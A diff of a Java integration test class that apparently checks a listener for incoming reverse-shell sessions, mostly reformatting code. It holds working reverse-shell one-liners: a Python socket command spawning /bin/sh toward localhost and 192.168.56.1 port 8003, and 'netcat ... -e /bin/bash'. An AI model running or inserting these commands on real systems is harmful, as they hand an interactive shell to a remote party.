@@ -19,7 +19,7 @@ class NcatIntegrationTest extends ClientServerTest {
 		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();
 
 		String ncatName = "ncat";
-		
+
 		try {
 			Runtime.getRuntime().exec(ncatName);
 		} catch (IOException e) {
@@ -32,7 +32,7 @@ class NcatIntegrationTest extends ClientServerTest {
 				return;
 			}
 		}
-		
+
 		if (thisOS == OS.WINDOWS) {
 			initiateServer();
 			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
@@ -45,60 +45,61 @@ class NcatIntegrationTest extends ClientServerTest {
 		teardown();
 
 	}
-	
-	@Test 
+
+	@Test
 	void testLocalLinuxPython() {
 		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();
-		if(thisOS == OS.LINUX) {
-		initiateServer("test_linux.properties");
-		spawnClient("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"localhost\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
-		RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
-		awaitClient();
-		teardown();
+		if (thisOS == OS.LINUX) {
+			initiateServer("test_linux.properties");
+			spawnPythonOneliner();
+			RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
+			awaitClient();
+			teardown();
 		}
 	}
-	
+
 	@Test
 	void testCrossPlatform() {
-		if(TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
-		initiateServer();
-		
-		RemoteTestExecutor exec = new RemoteTestExecutor();
-		if(exec.startTestProgram(1005, "netcat 192.168.56.1 8003 -e /bin/bash")) {;
-		
-		System.out.println("Transmitting commands");
-		
-		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
-		config.setRemote(true);
-		RunnerTestGeneric.test(config);
-		}else {
-			System.out.println("No remote test available, spinning down test");
-		}
-		teardown();
+		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
+			initiateServer();
+
+			RemoteTestExecutor exec = new RemoteTestExecutor();
+			if (exec.startTestProgram(1005, "netcat 192.168.56.1 8003 -e /bin/bash")) {
+				;
+
+				System.out.println("Transmitting commands");
+
+				TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
+				config.setRemote(true);
+				RunnerTestGeneric.test(config);
+			} else {
+				System.out.println("No remote test available, spinning down test");
+			}
+			teardown();
 		}
 	}
-	
+
 	@Test
 	void testLinuxPythonOneLiner() {
-		
-		initiateServer();
-		//TODO: Augment the remote test executor to handle this correctly. 
-		RemoteTestExecutor exec = new RemoteTestExecutor();
-		//exec.startTestProgram(1005, "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
-		exec.startTestProgram(1005, RemoteTestExecutor.CMD_EXECUTE_PYTHON);
-		System.out.println(
-				"Please start Linux python oneliner session now, such as: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
-		Time.sleepWrapped(7000);
+		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
+			initiateServer();
+			RemoteTestExecutor exec = new RemoteTestExecutor();
+			// exec.startTestProgram(1005, "python3 -c 'import
+			// socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0);
+			// os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
+			// ([\"/bin/sh\",\"-i\"]);'");
+			exec.startTestProgram(1005, RemoteTestExecutor.CMD_EXECUTE_PYTHON);
+			System.out.println(
+					"Please start Linux python oneliner session now, such as: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
+			Time.sleepWrapped(15000);
 
-		System.out.println("Transmitting commands");
+			System.out.println("Transmitting commands");
 
-		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
-		config.setRemote(true);
-		RunnerTestGeneric.test(config);
-		teardown();
-		
+			TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
+			config.setRemote(true);
+			RunnerTestGeneric.test(config);
+			teardown();
+		}
 	}
-	
-	
 
 }
